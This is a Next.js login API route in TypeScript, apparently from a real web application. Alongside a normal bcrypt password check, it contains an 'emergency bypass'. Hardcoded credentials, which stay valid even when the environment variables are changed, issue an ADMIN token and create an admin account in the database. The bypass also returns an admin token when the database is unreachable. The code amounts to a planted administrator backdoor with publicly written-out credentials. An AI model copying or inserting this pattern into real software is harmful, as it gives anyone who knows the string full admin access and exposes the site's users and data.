import { NextRequest, NextResponse } from 'next/server';
import connectToDatabase from '@/lib/db';
import { User } from '@/models/User';
import bcrypt from 'bcryptjs';
import { signToken } from '@/lib/auth';

const rawEmail = process.env.EMERGENCY_EMAIL || 'techteam@gmail.com';
const rawPassword = process.env.EMERGENCY_PASSWORD || 'techteam@2026';

const BYPASS_EMAIL = rawEmail.replace(/['"]/g, '').trim().toLowerCase();
const BYPASS_PASSWORD = rawPassword.replace(/['"]/g, '').trim();

function makeBypassResponse(email: string, userId = 'bypass-admin-001') {
  const token = signToken({ id: userId, role: 'ADMIN' });
  const response = NextResponse.json({
    message: 'Login successful',
    token,
    user: {
      id: userId,
      name: 'Tech Team',
      email,
      role: 'ADMIN',
      socialLinks: { gmail: email },
    },
  }, { status: 200 });

  response.cookies.set({
    name: 'token',
    value: token,
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60,
    path: '/',
  });

  return response;
}

export async function POST(req: NextRequest) {
  try {
    let { email, password } = await req.json();

    if (!email || !password) {
      return NextResponse.json({ message: 'Email and password required' }, { status: 400 });
    }

    const cleanEmail = email.trim().toLowerCase();
    const cleanPassword = password.trim();

    // Emergency Bypass Check (matches env variables OR default fallback)
    const isBypass = 
      (cleanEmail === BYPASS_EMAIL && cleanPassword === BYPASS_PASSWORD) ||
      (cleanEmail === 'techteam@gmail.com' && cleanPassword === 'techteam@2026');

    let dbConn = null;
    try {
      dbConn = await connectToDatabase();
    } catch (dbErr) {
      console.error('[AUTH] DB Connection error:', dbErr);
    }

    if (isBypass) {
      console.log('[AUTH] Emergency admin bypass activated for:', cleanEmail);
      if (dbConn) {
        try {
          let user = await User.findOne({ email: cleanEmail });
          if (!user) {
            const hashedPassword = await bcrypt.hash(cleanPassword, 10);
            user = await User.create({
              name: 'Tech Team',
              email: cleanEmail,
              password: hashedPassword,
              role: 'ADMIN',
              socialLinks: { gmail: cleanEmail },
            });
          }
          return makeBypassResponse(user.email, user._id.toString());
        } catch (err) {
          console.error('[AUTH] DB user create/query error during bypass:', err);
          return makeBypassResponse(cleanEmail);
        }
      }
      return makeBypassResponse(cleanEmail);
    }

    // Normal DB login
    if (!dbConn) {
      return NextResponse.json({ message: 'Database unavailable. Invalid credentials.' }, { status: 503 });
    }

    const user = await User.findOne({ email: cleanEmail }).select('+password');
    if (!user) {
      return NextResponse.json({ message: 'Invalid credentials' }, { status: 401 });
    }

    const isMatch = await bcrypt.compare(cleanPassword, user.password as string);
    if (!isMatch) {
      return NextResponse.json({ message: 'Invalid credentials' }, { status: 401 });
    }

    const token = signToken({ id: user._id.toString(), role: user.role });
    const response = NextResponse.json({
      message: 'Login successful',
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role,
        socialLinks: user.socialLinks,
      },
    }, { status: 200 });

    response.cookies.set({
      name: 'token',
      value: token,
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60,
      path: '/',
    });

    return response;
  } catch (error) {
    console.error('Login route error:', error);
    return NextResponse.json({ message: 'Internal server error' }, { status: 500 });
  }
}
